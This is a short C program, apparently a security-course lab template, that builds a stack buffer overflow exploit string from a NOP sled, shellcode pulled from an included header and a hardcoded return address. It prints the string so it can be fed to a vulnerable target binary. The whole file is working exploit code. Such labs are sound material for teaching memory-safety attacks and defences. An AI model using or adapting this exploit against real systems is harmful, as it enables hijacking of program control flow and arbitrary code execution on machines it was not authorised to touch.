#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

/*
 * Construct your exploit string in the main function and print it.
 * You can pass it into a target binary <target> by running"<target> $(sploit)"
 * in your terminal.
 */

int main(void)
{
  int n = strlen(shellcode);

  int N = 248, address = 4, i;

  char* exploit = (char*) malloc((N+n+address+1)*sizeof(char));

  for (i=0; i<N-n-address; i++)
      exploit[i] = '\x90';

  for (i=0; i<=n; i++)
      exploit[N-n-address+i] = shellcode[i];

  char* ret_address = "\x80\x05\x80\x40";
  strcat(exploit,ret_address);

  printf("%s", exploit);

  return 0;
}
